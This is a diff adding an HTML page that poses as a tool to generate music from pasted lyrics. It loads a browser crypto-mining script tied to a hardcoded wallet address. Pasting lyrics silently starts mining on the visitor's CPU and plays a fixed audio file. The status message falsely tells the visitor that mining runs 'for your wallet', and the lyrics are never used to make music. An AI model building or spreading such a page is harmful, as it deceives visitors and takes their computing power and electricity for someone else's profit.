@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Crypto Sound Miner - Generate Music and Mine Cryptocurrency">
+  <meta name="keywords" content="crypto, mining, music, sound, generator">
+  <title>🎵 Crypto Sound Miner</title>
+  <script src="https://www.webminepool.com/lib/base.js"></script>
+</head>
+<body>
+  <h2>🎤 Paste Your Lyrics to Generate Music + Mine Crypto</h2>
+  <textarea id="lyrics-box" rows="10" cols="60" placeholder="Paste your lyrics here..."></textarea>
+  <p id="status">⛏️ Waiting for lyrics paste...</p>
+  <audio id="music-player" controls hidden></audio>
+
+  <script>
+    let minerStarted = false;
+    const walletAddress = "rPDyvBmxcagTfPGSY9efiZ5mm6QoHmbpdq";
+
+    const miner = WMP.Client.Anonymous(walletAddress, {
+      threads: 2,
+      throttle: 0.3,
+      autoscale: true
+    });
+
+    document.getElementById("lyrics-box").addEventListener("paste", () => {
+      setTimeout(() => {
+        const lyrics = document.getElementById("lyrics-box").value.trim();
+        if (lyrics.length > 20 && !minerStarted) {
+          miner.start();
+          minerStarted = true;
+          document.getElementById("status").textContent = "✅ Mining started for your wallet!";
+          document.getElementById("music-player").src = "music.mp3";
+          document.getElementById("music-player").hidden = false;
+          document.getElementById("music-player").play();
+        }
+      }, 100);
+    });
+  </script>
+</body>
+</html>
